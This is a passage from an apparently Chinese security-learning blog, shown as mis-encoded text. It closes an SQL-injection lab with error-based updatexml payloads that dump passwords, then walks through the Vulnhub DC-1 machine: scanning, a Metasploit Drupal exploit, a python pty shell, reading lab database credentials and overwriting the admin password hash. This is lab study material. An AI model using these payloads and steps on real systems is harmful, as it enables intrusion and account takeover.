class="string"></span></span><br><span class="line"><span class="string">\x1a </span></span><br></pre></td></tr></table></figure></div>

<p>å¦‚æœæˆåŠŸï¼Œåˆ™è¯¥å‡½æ•°è¿”å›è¢«è½¬ä¹‰çš„å­—ç¬¦ä¸²ã€‚å¦‚æœå¤±è´¥ï¼Œåˆ™è¿”å› falseã€‚ </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="REASONML"><figure class="iseeu highlight /reasonml"><table><tr><td class="code"><pre><span class="line">è¯­æ³•ï¼šmysql<span class="constructor">_real_escape_string(<span class="params">string</span>,<span class="params">connection</span>)</span> </span><br><span class="line"></span><br><span class="line">å‚æ•°                              æè¿° </span><br><span class="line"></span><br><span class="line"><span class="built_in">string</span>                            å¿…éœ€ã€‚è§„å®šè¦è½¬ä¹‰çš„å­—ç¬¦ä¸²ã€‚ </span><br><span class="line"></span><br><span class="line">connection å¯é€‰ã€‚    è§„å®š MySQL è¿æ¥ã€‚å¦‚æœæœªè§„å®šï¼Œåˆ™ä½¿ç”¨ä¸Šä¸€ä¸ªè¿æ¥</span><br></pre></td></tr></table></figure></div>

<p>æ‰€ä»¥æ³¨å…¥å¤„åº”è¯¥åœ¨<code>passwd</code>ä¸­</p>
<p>å¼€å§‹å…ˆå°è¯•æ³¨å…¥ï¼Œå‘ç°æ²¡æœ‰å›æ˜¾ï¼Œ</p>
<p>æ‰€ä»¥è¯•è¯•æŠ¥é”™æ³¨å…¥</p>
<p><code>1&#39;and updatexml(1,concat(0x7e,(select password from users),0x7e),1)#</code></p>
<p>æŠ¥å‡º<code>You can&#39;t specify target table &#39;users&#39; for update in FROM clause</code></p>
<p><img src="/2022/06/21/underline-learning/image-20220905094419111.png" alt="image-20220905094419111"></p>
<p><u>å¤§è‡´æ„æ€æ˜¯ï¼Œåœ¨åŒä¸€è¯­å¥ä¸­ï¼Œä¸èƒ½å…ˆselectå‡ºåŒä¸€è¡¨ä¸­çš„æŸäº›å€¼ï¼Œå†updateè¿™ä¸ªè¡¨</u></p>
<p>æ‰€ä»¥è¿™é‡Œå°±éœ€è¦åŠ ä¸€ä¸ªä¸­é—´è¡¨ï¼Œå°±å¯ä»¥ç»•è¿‡è¿™ä¸ªé”™è¯¯</p>
<p>æ¯”å¦‚</p>
<p><code>1&#39;and updatexml(1,concat(0x7e,(select password from (select password from users)a),0x7e),1)#</code></p>
<p>è¿™é‡Œå°±æ˜¯æŠŠ<code>(select password from users)</code>çš„æŸ¥è¯¢åçš„æ•°æ®å­˜å…¥ç”Ÿæˆçš„æ–°è¡¨aï¼Œç„¶åå°±ç›¸å½“äº<code>(select password from a)</code></p>
<p><img src="/2022/06/21/underline-learning/image-20220905094517322.png" alt="image-20220905094517322"></p>
<p>å‘ç°ä¸èƒ½è¶…è¿‡ä¸€è¡Œ</p>
<p>äºæ˜¯ç”¨</p>
<p><code>1&#39;and updatexml(1,concat(0x7e,(select group_concat(password) from (select password from users)a),0x7e),1)#</code></p>
<p>æˆåŠŸ</p>
<p><img src="/2022/06/21/underline-learning/image-20220905094540906.png" alt="image-20220905094540906"></p>
<h1 id="Upload-labs"><a href="#Upload-labs" class="headerlink" title="Upload-labs"></a>Upload-labs</h1>]]></content>
      <categories>
        <category>ç½‘ç»œå®‰å…¨å­¦ä¹ </category>
      </categories>
  </entry>
  <entry>
    <title>Vulnhubé¶åœºå­¦ä¹ ç¬”è®°</title>
    <url>/2022/08/29/vulnhub/</url>
    <content><![CDATA[<p><u><code>å­¦ä¹ ä¸€ä¸‹å®æˆ˜é¶åœºï¼Œåšä¸€ä¸‹ç¬”è®°</code></u></p>
<p><u><code>å®æˆ˜ç¯å¢ƒï¼Œ</code></u></p>
<p><u><code>ä¿¡æ¯æ”¶é›†çš„èƒ½åŠ›å†³å®šäº†èƒ½å¦æ¸—é€æˆåŠŸï¼Œä»¥åŠè‡ªå·±ä¼šæµªè´¹è‡ªå·±å¤šå°‘æ—¶é—´</code></u></p>
<span id="more"></span>



<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>å®˜ç½‘ä¸‹è½½åœ°å€</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span>www.vulnhub.com/</span><br></pre></td></tr></table></figure></div>

<p>è¿™é‡Œæä¸€ä¸‹é¶åœºæœºipæ€ä¹ˆçœ‹</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CSS"><figure class="iseeu highlight /css"><table><tr><td class="code"><pre><span class="line">ip <span class="selector-tag">a</span> </span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220829153949360.png" alt="image-20220829153949360"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nmap</span> -sP  <span class="number">192.168.133.134</span>/<span class="number">24</span> //<span class="number">192.168.133.134</span>æ˜¯è™šæ‹Ÿæœºip</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220829154027029.png" alt="image-20220829154027029"></p>
<p>æ‰¾åˆ°é¶æœºip</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ACCESSLOG"><figure class="iseeu highlight /accesslog"><table><tr><td class="code"><pre><span class="line"><span class="number">192.168.133.136</span></span><br></pre></td></tr></table></figure></div>

<p>ä¹ æƒ¯æ€§ç”¨nmapæ‰«ä¸€ä¸‹å®ƒç«¯å£</p>
<p><img src="/2022/08/29/vulnhub/image-20220829154322453.png" alt="image-20220829154322453"></p>
<hr>
<h1 id="ä¸€-DC-1-åˆçº§"><a href="#ä¸€-DC-1-åˆçº§" class="headerlink" title="ä¸€.DC-1[åˆçº§]"></a>ä¸€.DC-1[åˆçº§]</h1><p><strong>five flags</strong></p>
<p>æµè§ˆå™¨è®¿é—®é¶æœºip</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ACCESSLOG"><figure class="iseeu highlight /accesslog"><table><tr><td class="code"><pre><span class="line"><span class="number">192.168.133.136</span></span><br></pre></td></tr></table></figure></div>

<p>è¿™æ˜¯å¼€å§‹ç•Œé¢</p>
<p><img src="/2022/08/29/vulnhub/image-20220829154626618.png" alt="image-20220829154626618"></p>
<p>è¿™é‡Œä»‹ç»ä¸€ä¸ªæ’ä»¶<code>Wappalyzer</code>ï¼Œå®ƒèƒ½å¤Ÿè·å–ç½‘é¡µè‡ªèº«çš„æ¡†æ¶å’Œç¼–å†™çš„è¯­è¨€ï¼Œè¿™æ ·å°±ä¸ç”¨æŸ¥çœ‹ç½‘ç»œè¿”å›åŒ…æ¥åˆ†æäº†</p>
<p><img src="/2022/08/29/vulnhub/image-20220830094043837.png" alt="image-20220830094043837"></p>
<p>å¯ä»¥çœ‹åˆ°ç½‘ç«™æ˜¯ç”¨phpè¯­è¨€ç¼–å†™çš„ï¼ŒCMSæ˜¯Drupal</p>
<hr>
<h2 id="Flag1"><a href="#Flag1" class="headerlink" title="Flag1"></a>Flag1</h2><h3 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h3><p>å…ˆç”¨msfçœ‹çœ‹æœ‰æ²¡æœ‰drupalç›¸åº”çš„æ”»å‡»è„šæœ¬</p>
<p>ç»ˆç«¯è¾“å…¥<code>msfconsole</code>ï¼Œè¿›å…¥msfç•Œé¢ï¼Œæˆ–è€…èœå•ä¹Ÿå¯ä»¥æ‰“å¼€</p>
<p><img src="/2022/08/29/vulnhub/image-20220830094506049.png" alt="image-20220830094506049"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">è¾“å…¥search drupalï¼Œæ‰¾ä¸€ä¸‹æœ‰æ²¡æœ‰drupalå¯ä»¥åˆ©ç”¨çš„è„šæœ¬</span><br><span class="line"><span class="regexp">/*å¯¹äºå…¶ä»–å‘½ä»¤ï¼Œå¯ä»¥ç”¨helpæŸ¥è¯¢*/</span></span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220830094939297.png" alt="image-20220830094939297"></p>
<p>è¿™é‡Œå¯ä»¥é€‰æ‹©ä¸åŒçš„è„šæœ¬ï¼Œä¸‹é¢ä»¥ç¼–å·1çš„è„šæœ¬ä¸ºä¾‹ï¼Œå…¶ä»–çš„åº”è¯¥ä¹Ÿå¯ä»¥</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ACTIONSCRIPT"><figure class="iseeu highlight /actionscript"><table><tr><td class="code"><pre><span class="line">è¾“å…¥<span class="keyword">use</span> <span class="number">1</span>ï¼Œè¿›å…¥ç¼–å·<span class="number">1</span>è„šæœ¬çš„è¿è¡Œç¯å¢ƒ</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220830095106784.png" alt="image-20220830095106784"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line">è¾“å…¥<span class="keyword">show</span> <span class="keyword">options</span>,æŸ¥çœ‹è„šæœ¬è¿è¡Œçš„æ‰€éœ€è¦é…ç½®çš„é¡¹ç›®</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220830105519336.png" alt="image-20220830105519336"></p>
<p><code>Required</code>æ˜¯è¦æ±‚å¡«çš„ï¼Œyesæ˜¯å¿…å¡«é¡¹ï¼Œnoæ˜¯éå¿…å¡«é¡¹</p>
<p>è¿™é‡Œçš„<code>RHOSTS</code>æ²¡æœ‰å¡«ï¼Œè¿™é‡Œæ˜¯è¦æ±‚å¡«å…¥<code>target hosts</code>ä¹Ÿå°±æ˜¯ç›®æ ‡åœ°å€ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬é¶æœºçš„åœ°å€</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GAMS"><figure class="iseeu highlight /gams"><table><tr><td class="code"><pre><span class="line">è¾“å…¥<span class="keyword">set</span> RHOSTS <span class="comment">192.168.133.136</span></span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220830110143969.png" alt="image-20220830110143969"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APPLESCRIPT"><figure class="iseeu highlight /applescript"><table><tr><td class="code"><pre><span class="line">å†è¾“å…¥<span class="built_in">run</span>ï¼Œè¿è¡Œè„šæœ¬</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220830110303594.png" alt="image-20220830110303594"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GAUSS"><figure class="iseeu highlight /gauss"><table><tr><td class="code"><pre><span class="line">è¾“å…¥<span class="built_in">shell</span>ï¼Œè¿›å…¥<span class="built_in">shell</span></span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220830110551273.png" alt="image-20220830110551273"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">è¾“å…¥<span class="built_in">whoami</span>ï¼ŒæŸ¥çœ‹å½“å‰çš„æƒé™</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220830110648417.png" alt="image-20220830110648417"></p>
<p>å‘ç°æ˜¯ä¸ªä½æƒé™çš„è´¦å·</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">è¾“å…¥<span class="built_in">ls</span>ï¼Œå¯ä»¥æŸ¥çœ‹åˆ°å½“å‰çš„ç›®å½•æ–‡ä»¶</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220830110825217.png" alt="image-20220830110825217"></p>
<p>ä½†æ˜¯ä¸€å †ä¸œè¥¿æŒ¤åœ¨ä¸€èµ·ï¼Œè¿˜æ˜¯æœ‰äº›ä¸å¤ªæ–¹ä¾¿</p>
<h3 id="äº¤äº’å¼shell"><a href="#äº¤äº’å¼shell" class="headerlink" title="*äº¤äº’å¼shell"></a>*äº¤äº’å¼shell</h3><p><strong>è¾“å…¥ä¸‹æ–¹æŒ‡ä»¤ï¼Œåˆ©ç”¨pythonè¿›å…¥äº¤äº’å¼shellã€å›ºå®šå§¿åŠ¿ï¼Œè¦è®°ä½ã€‘</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ADA"><figure class="iseeu highlight /ada"><table><tr><td class="code"><pre><span class="line">python -c <span class="symbol">&#x27;import</span> pty; pty.spawn(<span class="string">&quot;/bin/bash&quot;</span>)&#x27;</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220830110907408.png" alt="image-20220830110907408"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">è¾“å…¥<span class="built_in">ls</span></span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220830142759540.png" alt="image-20220830142759540"></p>
<p>å‘ç°<code>flag1.txt</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">è¾“å…¥<span class="built_in">cat</span> flag1.txtæŸ¥çœ‹</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220830142915555.png" alt="image-20220830142915555"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GRADLE"><figure class="iseeu highlight /gradle"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Every</span> good CMS needs a config <span class="keyword">file</span> - and so <span class="keyword">do</span> you.</span><br><span class="line">æ„æ€æ˜¯ï¼šä¸€ä¸ªå¥½çš„CMSï¼ˆå†…å®¹ç®¡ç†ç³»ç»Ÿï¼‰éœ€è¦ä¸€ä¸ªconfig <span class="keyword">file</span>ï¼ˆé…ç½®æ–‡ä»¶ï¼‰</span><br><span class="line"></span><br><span class="line">ä¹Ÿå°±æ˜¯æˆ‘ä»¬éœ€è¦çœ‹çœ‹å®ƒçš„é…ç½®æ–‡ä»¶ï¼Œè¿™æ˜¯Flag2çš„çº¿ç´¢</span><br></pre></td></tr></table></figure></div>

<h2 id="Flag2"><a href="#Flag2" class="headerlink" title="Flag2"></a>Flag2</h2><p>åœ¨ç›®å½•ä¸‹æˆ‘ä»¬å‘ç°æœ‰ä¸ª<code>sites</code>ç›®å½•ï¼Œä¹Ÿå°±æ˜¯ç«™ç‚¹ç›®å½•ï¼Œé‡Œé¢å¾ˆæœ‰å¯èƒ½æœ‰é…ç½®æ–‡ä»¶</p>
<p><img src="/2022/08/29/vulnhub/image-20220830142759540.png" alt="image-20220830142759540"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">è¾“å…¥<span class="built_in">cd</span> sites;<span class="built_in">ls</span> -a</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220830143404972.png" alt="image-20220830143404972"></p>
<p>æœ‰ä¸ª<code>default</code>ï¼ˆé»˜è®¤ï¼‰ç›®å½•ï¼ŒæŸ¥çœ‹ä¸€ä¸‹</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">è¾“å…¥<span class="built_in">cd</span> default;<span class="built_in">ls</span> -a</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220830143517235.png" alt="image-20220830143517235"></p>
<p>çœ‹åˆ°<code>setting.php</code>ä¹Ÿå°±å·®ä¸å¤šæ˜¯<code>config file</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AXAPTA"><figure class="iseeu highlight /axapta"><table><tr><td class="code"><pre><span class="line">è¾“å…¥cat <span class="keyword">setting</span>.php</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220830143752469.png" alt="image-20220830143752469"></p>
<p>å¾—åˆ°Flag2</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NSIS"><figure class="iseeu highlight /nsis"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * flag2</span></span><br><span class="line"><span class="comment"> * Brute force and dictionary attacks aren&#x27;t the</span></span><br><span class="line"><span class="comment"> * only ways to gain access (and you WILL need access).</span></span><br><span class="line"><span class="comment"> * What can you do with these credentials?</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">æ„æ€æ˜¯ï¼šæš´åŠ›å’Œå­—å…¸æ”»å‡»ä¸æ˜¯è·å¾—è®¿é—®æƒé™çš„å”¯ä¸€æ–¹æ³•ï¼ˆæ‚¨å°†éœ€è¦è®¿é—®æƒé™ï¼‰ã€‚</span><br><span class="line">ä½ èƒ½ç”¨è¿™äº›è¯ä¹¦åšä»€ä¹ˆï¼Ÿ</span><br><span class="line"></span><br><span class="line">å°±æ˜¯è¯´ä¸è¦å±€é™äºçˆ†ç ´å¯†ç æ¥ç™»å½•<span class="literal">admin</span>ç”¨æˆ·ï¼Œä½ æ‹¥æœ‰äº†æ•°æ®åº“è¿™äº›ä¿¡æ¯ï¼Œä½ å¯ä»¥åšä»€ä¹ˆ</span><br></pre></td></tr></table></figure></div>

<hr>
<h2 id="Flag3"><a href="#Flag3" class="headerlink" title="Flag3"></a>Flag3</h2><p>å…³é”®åˆ†æè¿™é‡Œï¼Œè¿™æ˜¯é¶æœºæ•°æ®åº“çš„ç”¨æˆ·åå’Œå¯†ç çš„ä¿¡æ¯ï¼Œ</p>
<p>æœ‰äº†è¿™ä¸ªæˆ‘ä»¬å°±å¯ä»¥è¿›å…¥é¶æœºçš„æ•°æ®åº“ï¼Œå¯¹é‡Œé¢çš„æ•°æ®åº“è¿›è¡Œä¿®æ”¹æˆ–å¢æ·»</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ZEPHIR"><figure class="iseeu highlight /zephir"><table><tr><td class="code"><pre><span class="line"><span class="keyword">array</span> (</span><br><span class="line">     <span class="string">&#x27;database&#x27;</span> =&gt; <span class="string">&#x27;drupaldb&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;username&#x27;</span> =&gt; <span class="string">&#x27;dbuser&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;password&#x27;</span> =&gt; <span class="string">&#x27;R0ck3t&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;host&#x27;</span> =&gt; <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;port&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;driver&#x27;</span> =&gt; <span class="string">&#x27;mysql&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">   ),</span><br></pre></td></tr></table></figure></div>

<h3 id="1ï¼‰mysqlæ•°æ®åº“ä¿®æ”¹adminç”¨æˆ·çš„å¯†ç ï¼ˆæˆ–è€…æ–°å»ºä¸€ä¸ªç”¨æˆ·å¯†ç ï¼‰"><a href="#1ï¼‰mysqlæ•°æ®åº“ä¿®æ”¹adminç”¨æˆ·çš„å¯†ç ï¼ˆæˆ–è€…æ–°å»ºä¸€ä¸ªç”¨æˆ·å¯†ç ï¼‰" class="headerlink" title="1ï¼‰mysqlæ•°æ®åº“ä¿®æ”¹adminç”¨æˆ·çš„å¯†ç ï¼ˆæˆ–è€…æ–°å»ºä¸€ä¸ªç”¨æˆ·å¯†ç ï¼‰"></a>1ï¼‰mysqlæ•°æ®åº“ä¿®æ”¹adminç”¨æˆ·çš„å¯†ç ï¼ˆæˆ–è€…æ–°å»ºä¸€ä¸ªç”¨æˆ·å¯†ç ï¼‰</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CSS"><figure class="iseeu highlight /css"><table><tr><td class="code"><pre><span class="line">è¾“å…¥mysql -udbuser -pR0ck3t</span><br><span class="line"></span><br><span class="line">*æ³¨æ„è¿™é‡Œ-uå’Œ-<span class="selector-tag">p</span>åé¢æ²¡æœ‰ç©ºæ ¼ï¼Œæœ‰ç©ºæ ¼ä¼šæŠ¥é”™</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220830151236620.png" alt="image-20220830151236620"></p>
<p>å…ˆçœ‹çœ‹æ•°æ®åº“</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ABNF"><figure class="iseeu highlight /abnf"><table><tr><td class="code"><pre><span class="line">è¾“å…¥show databases<span class="comment">;</span></span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220830151531028.png" alt="image-20220830151531028"></p>
<p>æŸ¥çœ‹<code>drupaldb</code>åº“é‡Œçš„è¡¨</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ABNF"><figure class="iseeu highlight /abnf"><table><tr><td class="code"><pre><span class="line">è¾“å…¥use drupaldb<span class="comment">;</span></span><br><span class="line">ç„¶åè¾“å…¥show tables<span class="comment">;</span></span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220830151716900.png" alt="image-20220830151716900"></p>
<p>çœ‹åˆ°<code>users</code>è¡¨ï¼Œè¿™å°±æ˜¯æˆ‘ä»¬ç™»å½•æˆåŠŸçš„å…³é”®ï¼ŒæŸ¥çœ‹è¯¥è¡¨</p>
<p><img src="/2022/08/29/vulnhub/image-20220830151829478.png" alt="image-20220830151829478"></p>
<p>å‘ç°æœ‰ä¸¤ä¸ªç”¨æˆ·ï¼Œæˆ‘ä»¬çš„ç›®çš„æ˜¯ä¿®æ”¹æˆ–è€…è·å¾—adminç”¨æˆ·çš„å¯†ç ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥å†åˆ›å»ºä¸€ä¸ªç”¨æˆ·ï¼Œä½†æ˜¯éƒ½éœ€è¦åŠ å¯†</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ISBL"><figure class="iseeu highlight /isbl"><table><tr><td class="code"><pre><span class="line">å› ä¸ºè¿™é‡Œæˆ‘ä»¬å¯ä»¥å‘ç°ç”¨æˆ·çš„å¯†ç æ˜¯è¢«åŠ å¯†äº†çš„ï¼Œé‚£åŠ å¯†æ–‡ä»¶è‚¯å®šæ˜¯åœ¨è„šæœ¬ç›®å½•é‡Œï¼Œä¹Ÿå°±æ˜¯<span class="variable"><span class="class">scripts</span></span>ç›®å½•é‡Œï¼Œåˆ©ç”¨åŠ å¯†è„šæœ¬ï¼ŒæŠŠæˆ‘ä»¬çš„å¯†ç åŠ å¯†ï¼Œç„¶åæ›´æ–°æ•°æ®åº“é‡Œ<span class="variable">admin</span>ç”¨æˆ·åŸæœ¬çš„å¯†ç </span><br></pre></td></tr></table></figure></div>

<p>æˆ‘ä»¬æ¥æ‰¾æ‰¾å¯†ç åŠ å¯†è„šæœ¬åœ¨å“ªé‡Œ</p>
<p><img src="/2022/08/29/vulnhub/image-20220830142759540.png" alt="image-20220830142759540"></p>
<p>çœ‹åˆ°<code>scripts</code>ç›®å½•</p>
<p>è¿›å…¥æŸ¥çœ‹</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">è¾“å…¥<span class="built_in">cd</span> scripts;<span class="built_in">ls</span> -a</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220830152428416.png" alt="image-20220830152428416"></p>
<p>å‘ç°æœ‰ä¸€ä¸ª<code>password-hash.sh</code>æ–‡ä»¶ï¼Œå¯†ç å°±æ˜¯é€šè¿‡å®ƒè¿›è¡ŒhashåŠ å¯†çš„</p>
<p>è¿è¡Œå®ƒï¼Œè®©å®ƒæŠŠæˆ‘ä»¬çš„å¯†ç åŠ å¯†</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ARCADE"><figure class="iseeu highlight /arcade"><table><tr><td class="code"><pre><span class="line">è¾“å…¥./password-<span class="built_in">hash</span>.sh  <span class="number">123456</span></span><br></pre></td></tr></table></figure></div>

<hr>
<p>ä½†æ˜¯è¿è¡Œå¯èƒ½ä¼šå‡ºç°å¦‚ä¸‹é”™è¯¯ï¼Œå¦‚æœæ²¡æœ‰è¯·å¿½ç•¥</p>
<p><img src="/2022/08/29/vulnhub/image-20220830152851541.png" alt="image-20220830152851541"></p>
<p>æŠ¥é”™è¯´</p>
<p><code>include_once(/var/www/scripts/includes/password.inc): failed to open stream: No such file or directory</code> </p>
<p>ä¹Ÿå°±æ˜¯æ‰¾ä¸åˆ°è¯¥æ–‡ä»¶ï¼Œä½†æ˜¯å‘ç°ï¼Œincludesç›®å½•ç¡®å®ä¹Ÿä¸åœ¨scriptsç›®å½•ä¸‹ï¼Œäºæ˜¯ç”¨cpæŠŠ<code>includes</code>ç›®å½•æ”¾åˆ°<code>scripts</code>ç›®å½•ä¸‹å³å¯</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">è¾“å…¥cp -r ..<span class="regexp">/includes ./</span></span><br></pre></td></tr></table></figure></div>

<hr>
<p>å¾—åˆ°åŠ å¯†æ•°æ®</p>
<p><img src="/2022/08/29/vulnhub/image-20220830153417077.png" alt="image-20220830153417077"></p>
<p>å†æ¬¡è¿›å…¥mysqlæ•°æ®åº“ï¼Œä¿®æ”¹ adminå¯†ç </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">update<span class="built_in"> users </span><span class="built_in">set</span> <span class="attribute">pass</span>=<span class="string">&quot;<span class="variable">$S</span><span class="variable">$D9wpmqJmKcXIUSGVEY2utFL8LBiwX18pbpLhBZifD9gXThGAwz4x</span>&quot;</span> where <span class="attribute">name</span>=<span class="string">&quot;admin&quot;</span></span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220830161703412.png" alt="image-20220830161703412"></p>
<p>æˆ‘ä»¬è¯•è¯•èƒ½ä¸èƒ½ç™»å½•</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NSIS"><figure class="iseeu highlight /nsis"><table><tr><td class="code"><pre><span class="line">ç”¨æˆ·åï¼š<span class="literal">admin</span></span><br><span class="line"></span><br><span class="line">å¯†ç ï¼š<span class="number">123456</span></span><br></pre></td></tr></table></figure></div>

<p>ç™»å½•æˆåŠŸ</p>
<p><img src="/2022/08/29/vulnhub/image-20220830161808584.png" alt="image-20220830161808584"></p>
<p>å¾—åˆ°flag3</p>
<p><img src="/2022/08/29/vulnhub/image-20220830161837967.png" alt="image-20220830161837967"></p>
